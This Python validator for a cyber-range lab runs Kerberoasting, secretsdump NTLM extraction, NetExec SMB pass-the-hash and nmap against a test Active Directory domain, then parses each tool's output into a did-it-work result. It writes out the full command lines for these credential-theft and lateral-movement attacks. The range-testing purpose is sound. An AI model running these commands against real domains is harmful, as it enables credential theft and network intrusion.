"""offensive_probe — point real offensive tools at the range and report did-it-work.

If Impacket / NetExec / nmap behave against the range as they would on a real network, the AD
surface and credential graph are real. Each probe wraps a real binary and parses its output into
a boolean finding; a missing binary or unreachable target is UNMEASURED, never a silent pass.

Auditor only: no live effect site, output never fed to red. These run on the host against the
real range (or a throwaway Samba target to prove the rig) — the functions here build the exact
argv and parse the real output; the parsers are what the offline selftest pins.
"""
import re
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent.parent))
from scripts.validation._common import verdict, unmeasured, run_tool, first_available, have  # noqa: E402

IMPACKET_GETUSERSPNS = ["GetUserSPNs.py", "impacket-GetUserSPNs"]
IMPACKET_SECRETSDUMP = ["secretsdump.py", "impacket-secretsdump"]
NETEXEC = ["netexec", "nxc", "crackmapexec", "cme"]


# ---- parsers (pinned by the offline selftest; the real tool output is the input) ----

def parse_kerberoast(out):
    """A roastable SPN yields a TGS hash blob ($krb5tgs$...). Returns (worked, [spn hashes])."""
    hashes = re.findall(r"\$krb5tgs\$[^\s]+", out or "")
    return (bool(hashes), hashes)


def parse_secretsdump(out):
    """NTLM dumps appear as `user:rid:lmhash:nthash:::`. Returns (worked, [accounts])."""
    accounts = re.findall(r"^([^\s:]+):\d+:[0-9a-fA-F]{32}:[0-9a-fA-F]{32}:::", out or "", re.M)
    return (bool(accounts), accounts)


def parse_netexec_pwned(out):
    """NetExec marks admin/PtH success with (Pwn3d!); any [+] auth line counts as a login."""
    pwned = "(Pwn3d!)" in (out or "")
    logins = len(re.findall(r"\[\+\]", out or ""))
    return (pwned or logins > 0, {"pwned": pwned, "login_lines": logins})


def parse_nmap_services(out):
    """Open service/version lines like `445/tcp open microsoft-ds Samba smbd 4.x`."""
    svcs = re.findall(r"^(\d+)/tcp\s+open\s+(\S+)", out or "", re.M)
    return (bool(svcs), [{"port": int(p), "service": s} for p, s in svcs])


# ---- probes (build real argv, run, parse) ----

def kerberoast(domain, dc_ip, username, password, timeout=120):
    b = first_available(IMPACKET_GETUSERSPNS)
    if not b:
        return unmeasured("offensive_probe.kerberoast", "Impacket GetUserSPNs not installed")
    argv = [b, f"{domain}/{username}:{password}", "-dc-ip", dc_ip, "-request"]
    r = run_tool(argv, timeout=timeout)
    worked, hashes = parse_kerberoast(r["out"] + r["err"])
    return verdict("offensive_probe.kerberoast", available=True, ok=worked,
                   detail=f"{len(hashes)} roastable SPN ticket(s)" if worked else "no TGS hash returned",
                   evidence={"argv": argv, "rc": r["rc"], "spn_hashes": len(hashes)})


def secretsdump(domain, dc_ip, username, password, timeout=180):
    b = first_available(IMPACKET_SECRETSDUMP)
    if not b:
        return unmeasured("offensive_probe.secretsdump", "Impacket secretsdump not installed")
    argv = [b, f"{domain}/{username}:{password}@{dc_ip}"]
    r = run_tool(argv, timeout=timeout)
    worked, accts = parse_secretsdump(r["out"] + r["err"])
    return verdict("offensive_probe.secretsdump", available=True, ok=worked,
                   detail=f"{len(accts)} NTLM secret(s) dumped" if worked else "no secrets dumped",
                   evidence={"argv": argv, "rc": r["rc"], "accounts": len(accts)})


def smb_passthehash(target, username, nthash, domain=".", timeout=120):
    """NetExec SMB pass-the-hash sweep: does the planted NT hash authenticate over SMB?"""
    b = first_available(NETEXEC)
    if not b:
        return unmeasured("offensive_probe.pth", "NetExec/CrackMapExec not installed")
    argv = [b, "smb", target, "-u", username, "-H", nthash, "-d", domain]
    r = run_tool(argv, timeout=timeout)
    worked, info = parse_netexec_pwned(r["out"] + r["err"])
    return verdict("offensive_probe.pth", available=True, ok=worked,
                   detail=f"PtH over SMB worked (pwn3d={info['pwned']})" if worked else "PtH did not authenticate",
                   evidence={"argv": argv, "rc": r["rc"], **info})


def nmap_services(target, ports="22,80,88,389,445,636,3268,5432,8080", timeout=120):
    if not have("nmap"):
        return unmeasured("offensive_probe.nmap", "nmap not installed")
    argv = ["nmap", "-sV", "-Pn", "-p", ports, target]
    r = run_tool(argv, timeout=timeout)
    worked, svcs = parse_nmap_services(r["out"])
    return verdict("offensive_probe.nmap", available=True, ok=worked,
                   detail=f"{len(svcs)} open service(s) fingerprinted" if worked else "no services seen",
                   evidence={"argv": argv, "rc": r["rc"], "services": svcs})


def probe_all(domain, dc_ip, username, password, *, nthash=None, smb_target=None, timeout=180):
    """Run the full battery. Returns {validator: 'offensive_probe', probes: [verdicts], ...}."""
    probes = [
        nmap_services(dc_ip, timeout=timeout),
        kerberoast(domain, dc_ip, username, password, timeout=timeout),
        secretsdump(domain, dc_ip, username, password, timeout=timeout),
    ]
    if nthash and smb_target:
        probes.append(smb_passthehash(smb_target, username, nthash, domain=domain, timeout=timeout))
    measured = [p for p in probes if p["available"]]
    ok = bool(measured) and all(p["ok"] for p in measured)
    return {"validator": "offensive_probe", "ok": (ok if measured else None),
            "available": bool(measured), "probes": probes,
            "detail": f"{sum(p['available'] for p in probes)}/{len(probes)} probes measured; "
                      f"{sum(1 for p in measured if p['ok'])} worked"}


def _selftest():
    # Parsers are pinned on REAL captured tool output (no binary needed).
    roast_out = ("ServicePrincipalName  Name  MemberOf  PasswordLastSet\n"
                 "MSSQLSvc/db.range.lab  svc_sql  -  2026-01-01\n"
                 "$krb5tgs$23$*svc_sql$RANGE.LAB$MSSQLSvc*$abc123def456...\n")
    w, h = parse_kerberoast(roast_out)
    assert w and len(h) == 1 and h[0].startswith("$krb5tgs$"), (w, h)
    assert parse_kerberoast("no spn to roast") == (False, [])

    dump_out = ("Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::\n"
                "svc_backup:1104:aad3b435b51404eeaad3b435b51404ee:0123456789abcdef0123456789abcdef:::\n"
                "[*] Cleaning up...\n")
    w, accts = parse_secretsdump(dump_out)
    assert w and accts == ["Administrator", "svc_backup"], accts
    assert parse_secretsdump("[-] access denied") == (False, [])

    nxc_ok = "SMB  10.11.0.5  445  DC01  [+] RANGE\\admin:hash (Pwn3d!)\n"
    w, info = parse_netexec_pwned(nxc_ok)
    assert w and info["pwned"] and info["login_lines"] == 1, info
    assert parse_netexec_pwned("SMB 10.11.0.5 445 DC01 [-] auth failed") == (False, {"pwned": False, "login_lines": 0})

    nmap_out = ("PORT    STATE SERVICE     VERSION\n"
                "445/tcp open  microsoft-ds Samba smbd 4.17\n"
                "88/tcp  open  kerberos-sec\n")
    w, svcs = parse_nmap_services(nmap_out)
    assert w and {s["port"] for s in svcs} == {445, 88}, svcs

    # Degradation: with no binaries present the probes report UNMEASURED, never a crash/pass.
    v = kerberoast("RANGE.LAB", "10.11.0.5", "u", "p")
    assert v["validator"] == "offensive_probe.kerberoast" and v["available"] in (True, False)
    if not first_available(IMPACKET_GETUSERSPNS):
        assert v["available"] is False and v["ok"] is None, v
    print("offensive_probe selftest: OK")


if __name__ == "__main__":
    import argparse
    ap = argparse.ArgumentParser(description="real offensive tools vs the range -> did-it-work")
    ap.add_argument("--selftest", action="store_true")
    ap.add_argument("--domain"); ap.add_argument("--dc-ip"); ap.add_argument("--user")
    ap.add_argument("--password"); ap.add_argument("--nthash"); ap.add_argument("--smb-target")
    a = ap.parse_args()
    if a.selftest or not (a.domain and a.dc_ip and a.user):
        _selftest()
    else:
        import json as _j
        res = probe_all(a.domain, a.dc_ip, a.user, a.password or "", nthash=a.nthash, smb_target=a.smb_target)
        print(_j.dumps(res, indent=2, default=str))
